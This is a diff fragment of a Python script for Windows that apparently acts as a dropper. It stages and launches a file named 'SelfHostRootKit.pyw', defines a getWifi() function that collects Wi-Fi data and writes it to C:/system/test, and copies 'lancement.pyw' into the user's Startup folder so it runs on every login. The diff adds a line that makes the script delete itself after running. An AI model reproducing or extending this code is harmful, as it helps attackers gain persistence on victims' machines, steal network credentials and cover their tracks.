@@ -67,7 +67,6 @@ except:
 move('SelfHostRootKit.pyw', 'C:\system')
 chdir("C:\system")
 Popen("start SelfHostRootKit.pyw", shell=True)
-
 def getWifi():
     import subprocess
     ret = ''
@@ -81,7 +80,6 @@ def getWifi():
         except:
             pass
     return ret.replace('\\n', '').replace('\\r', '')
-
 with open('C:/system/test', 'w') as file:
     file.write(getWifi())""")
 try:
@@ -91,3 +89,4 @@ except:
 move('lancement.pyw', 'C:/Users/admin\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup')
 chdir('C:/Users/admin\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup')
 system('start lancement.pyw')
+remove(__file__)
